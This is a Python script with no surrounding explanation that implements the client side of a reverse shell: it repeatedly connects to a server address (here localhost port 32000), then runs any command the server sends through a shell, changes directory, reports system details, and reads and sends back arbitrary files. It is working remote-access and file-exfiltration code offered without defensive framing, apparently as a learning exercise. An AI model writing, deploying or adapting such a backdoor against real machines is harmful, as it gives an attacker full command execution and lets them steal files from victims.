import socket
import subprocess
import platform
import time
import os

HOST_IP = '127.0.0.1'
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

# Connect to server
while True:
    try:
        # Create socket client
        client = socket.socket()
        print(f'Connect to server {HOST_IP}:{HOST_PORT}')
        client.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError as e:
        print(f'ERROR: Connection refused to server {HOST_IP}:{HOST_PORT} - Retry connection...')
        time.sleep(4)
    else:
        print('Connection established')
        break

while True:
    # Receive data from server
    command_data = client.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print(f'Command: {command}')
    command_split = command.split(' ')

    if command == 'show':
        response = (platform.platform() + ' ' + os.getcwd()).encode()
    elif len(command_split) == 2 and command_split[0] == 'cd':
        try:
            os.chdir(command_split[1].strip('\''))
            response = ' '.encode()
        except FileNotFoundError as e:
            response = f'{e.strerror} {e.filename}'.encode
    elif len(command_split) == 2 and command_split[0] == 'get':
        try:
            f = open(command_split[1], 'rb')
        except FileNotFoundError as e:
            response = ' '.encode()
        else:
            response = f.read()
            f.close()
    else:
        result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
        response = (result.stdout + result.stderr).encode()
        if not response or len(response) == 0:
            response = ' '.encode()

    # handshake
    data_len = len(response)
    header = str(data_len).zfill(13)
    print(f'Header: {header}')
    client.sendall(header.encode())
    if data_len > 0:
        client.sendall(response)

# Close the socket
client.close()
